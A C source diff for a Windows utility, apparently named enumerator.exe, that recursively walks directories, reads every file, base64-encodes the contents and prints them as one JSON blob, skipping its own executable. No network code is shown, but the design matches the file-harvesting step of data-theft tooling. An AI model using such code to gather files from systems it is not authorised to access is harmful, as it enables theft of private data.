@@ -57,6 +57,12 @@ struct FS_Element
     char name[MAX_PATH_SIZE];
 
     /**
+     * The path to the file system element.
+     * We explained the MAX_PATH_SIZE logic in the comment for the name variable.
+     */
+    char file_path[MAX_PATH_SIZE + MAX_PATH_SIZE];
+
+    /**
      * Whether a file system element is a directory (read: folder)
      */
     BOOLEAN is_directory;
@@ -112,15 +118,31 @@ BOOLEAN is_directory(char* path)
     return FALSE;
 }
 
+// /**
+//  * Convert backslashes in path to \ in Windows notation
+//  * The good news for us is that Windows will not allow you to use / or \ in your file names. You also must use legit ASCII characters that can be strlen()'d.
+//  */
+// void normalize_path_windows(char* path)
+// {
+//     for (int i = 0; i < strlen(path); i++)
+//     {
+//         if (path[i] == '/')
+//         {
+//             path[i] = '\\';
+//         }
+//     }
+// }
+
 /**
  * Enumerates the file system starting from $ROOT_PATH.
  * It will then enumerate recursively for $MAX_DEPTH number of directories
  * @param depth Starts at 0. Indicates the number of directories we're peering into. This does mean a $MAX_DEPTH of 0 is just $ls_read.exe
  * @param dir_path Directory path to enumerate. When you call this, this should usually always be $ROOT_PATH
+ * @param dir_name Directory name. You don't need to touch this (just put in NULL).
  * @note You are responsible for free-ing all the FS_Element structs recursively. We reccomend calling free_fs_element
  * @returns A FS_Element struct representing the current directory. If there is nothing to enumerate (due to us exceeding $MAX_DEPTH usually), this returns NULL
  */
-struct FS_Element* enumerate(int depth, char* dir_path)
+struct FS_Element* enumerate(int depth, char* dir_path, char* dir_name)
 {
     // 🚨 Apparently, FindFirstFileA is a bozo. This means it won't match everything in dir_path and instead, we need to provide it a "regex" like query
     // This just concatenates a wildcard at the end so that we query through everything in our directory
@@ -136,9 +158,18 @@ struct FS_Element* enumerate(int depth, char* dir_path)
         // Create a current file system element for this directory
         struct FS_Element* curr_element = malloc(sizeof(struct FS_Element));
 
-        // Get the current directory name and append it to the struct. This windows call automatically handles input size for us
-        GetCurrentDirectory(MAX_PATH_SIZE - 1, curr_element->name);
-        curr_element->name[MAX_PATH_SIZE] = '\0';
+        // Get the dir_path for directories working
+        strncpy(curr_element->file_path, dir_path, MAX_PATH_SIZE);
+
+        // Get the current directory name and append it to the struct. This doesn't affect pathing - just the name
+        if (dir_name != NULL)
+        {
+            strncpy(curr_element->name, dir_name, MAX_PATH_SIZE);
+        }
+        else
+        {
+            strncpy(curr_element->name, "Default", 8);
+        }
 
         // This is a directory, so let's initialize some stuff off that:
         curr_element->dir_size = 0;
@@ -178,16 +209,16 @@ struct FS_Element* enumerate(int depth, char* dir_path)
 
                 // Check to see if we have a directory. If we do, start recursion here
                 char full_path[MAX_PATH_SIZE];
-                PathCombine(full_path, dir_path, file_data.cFileName);
+                PathCombine(full_path, dir_path, file_data.cFileName);      // While we're at it, copy the full path into file_path
 
                 if (is_directory(full_path))
                 {
-                    struct FS_Element* dir_data = enumerate(depth + 1, full_path);
+                    struct FS_Element* dir_data = enumerate(depth + 1, full_path, file_data.cFileName);
 
                     // If the dir actually has stuff, add it to our elements path
                     if (dir_data != NULL)
                     {
-                        printf("%s : directory\n", file_data.cFileName);
+                        // printf("%s : directory\n", dir_data->file_path);
                         curr_element->dir_elements[curr_element->dir_size] = dir_data;
                         curr_element->dir_size += 1;
                     }
@@ -202,21 +233,141 @@ struct FS_Element* enumerate(int depth, char* dir_path)
                     strncpy(file_element->name, file_data.cFileName, MAX_PATH_SIZE - 1);
                     file_element->name[strlen(file_data.cFileName)] = '\0';
 
+                    // Add the path
+                    strncpy(file_element->file_path, full_path, MAX_PATH_SIZE - 1);
+                    file_element->file_path[strlen(full_path)] = '\0';
+
                     // Add the file element to the current element's array
                     curr_element->dir_elements[curr_element->dir_size] = file_element;
                     curr_element->dir_size += 1;
 
-                    printf("%s : file\n", file_data.cFileName);
+                    // printf("%s : file\n", file_element->name);
                 }
             }
 
         } while (FindNextFileA(search_handle, &file_data) != 0);     // FindNextFile returns 0 when it fails
 
-        // And we're done! Return the current element
         return curr_element;
     }
 
     return NULL;
+}
+
+/**
+ * Recursively creates a JSON string to represent all the file contents we have
+ * @param curr_element The current file system element to convert into JSON
+ * @param json_length {Outbound} Pointer that will output length of the JSON string. This includes the null terminator
+ * @note You are responsible for free()ing the JSON string
+ * @returns A JSON string with the keys being the file (or directory) names and the value either being base64 of file contents. Returns NULL if curr_element is invalid
+ */
+char* spill_file_json(struct FS_Element* curr_element, int* json_length)
+{
+    int json_size = 2;          // Start with \0 and {.        
+    
+    //⭐ From this point forward, we already took \0 into account!!!
+    char* json_str = malloc(json_size);
+    strcpy(json_str, "{");
+
+    // Now, let's copy either the file contents, or the other JSON from file elements in the directory
+    if (curr_element->is_directory)
+    {
+        // First, write the directory name as key
+        // At this stage we should see something like {"EnumeratorRecursive":[
+        
+        // 🃏 Important note: Base64 does not have the character ". The helper function highly discourages us from using concat_str_mem
+        concat_mem(&json_str, json_size - 1, "\"", 2, &json_size);
+        concat_mem(&json_str, json_size - 1, curr_element->name, strlen(curr_element->name) + 1, &json_size);
+        concat_mem(&json_str, json_size - 1, "\":[", 4, &json_size);
+
+        // Now, recursively traverse the directory elements. Add their JSON to the overall JSON
+        for (int i = 0; i < curr_element->dir_size; i++)
+        {
+            // Initiate child length
+            int child_json_len = 0;     // At the end of this, this will include \0
+            char* child_json = spill_file_json(curr_element->dir_elements[i], &child_json_len);
+
+            // Take care of NULL cases (invalid files)
+            if (child_json == NULL)
+            {
+                continue;
+            }
+            else
+            {
+                // Copy the child_json over to our bigger json
+                concat_mem(&json_str, json_size - 1, child_json, child_json_len, &json_size);
+
+                // Add a comma. At this point, we should see  {"EnumeratorRecursive":[ {.....} ,
+                // However, if i is the last element, don't do that
+                if (i != curr_element->dir_size - 1)
+                {
+                    concat_mem(&json_str, json_size - 1, ",", 2, &json_size);
+                }
+
+                // We don't have a use for child_json anymore. Free it.
+                free(child_json);
+            }
+        }
+
+        // At this point, we should see  {"EnumeratorRecursive":[ {.....}, {.....},
+        // Turn it into {"EnumeratorRecursive":[ {.....}, {.....} ] }
+        concat_mem(&json_str, json_size - 1, "]}", 3, &json_size);
+        // json_str[json_size] = '\0';
+    }
+    else
+    {
+        // Prevent enumerator.exe from being read
+        if (strcmp(curr_element->name, "enumerator.exe") == 0)
+        {
+            free(json_str);
+            *json_length = 0;
+            return NULL;
+        }
+
+        // Open the file. This is going to be very similar to ls_read.
+        FILE* read_file = fopen(curr_element->file_path, "rb");
+
+        // Let's actually make sure the file exists. If it doesn't, continue.
+        // Also, prevent enumerator.exe from being read
+        if (read_file == NULL)
+        {
+            free(json_str);
+            *json_length = 0;
+            return NULL;
+        }
+
+        // First, let's read the actual file.
+        // We'll temporarily store the contents in the file_contents string
+        long file_contents_size = get_file_size(read_file);
+        char* file_contents = malloc(file_contents_size + 1); // Malloc the null byte
+        fread(file_contents, file_contents_size, 1, read_file);
+        file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves
+        fclose(read_file);
+
+        // Now that we read from the file content, convert this to base64
+        // Again, the base64 function requires us to malloc a string with the intended the base64 string size
+        int b64_size = base64_size(file_contents_size);
+        char* base64_str = malloc(b64_size + 1);            // Add 1 byte for \0
+        base64(file_contents, file_contents_size, base64_str);
+        base64_str[b64_size] = '\0';
+
+        // Actually write the string here
+        // This writes the key
+        concat_mem(&json_str, json_size - 1, "\"", 2, &json_size);
+        concat_mem(&json_str, json_size - 1, curr_element->name, strlen(curr_element->name) + 1, &json_size);
+        concat_mem(&json_str, json_size - 1, "\":", 3, &json_size);
+
+        // Write the base64 file content
+        concat_mem(&json_str, json_size - 1, "\"", 2, &json_size);
+        concat_mem(&json_str, json_size - 1, base64_str, b64_size + 1, &json_size);   // Base64 size does not take into account \0, so we add 1
+        concat_mem(&json_str, json_size - 1, "\"}", 3, &json_size);
+
+        // Garbage collector
+        free(file_contents);
+        free(base64_str);
+    }
+
+    *json_length = json_size;
+    return json_str;
 }
 
 int main(int argc, char** argv)
@@ -243,8 +394,14 @@ int main(int argc, char** argv)
     }
 
     // Run enumerator
-    struct FS_Element* enumerated_results = enumerate(0, ROOT_PATH);
-    free_fs_element(enumerated_results);
+    struct FS_Element* enumerated_results = enumerate(0, ROOT_PATH, NULL);
+    
+    int json_str_len = 0;
+    char* json_str = spill_file_json(enumerated_results, &json_str_len);
+    puts(json_str);
 
+    // Garbage Collection
+    free(json_str);
+    free_fs_element(enumerated_results);
     return 0;
 }
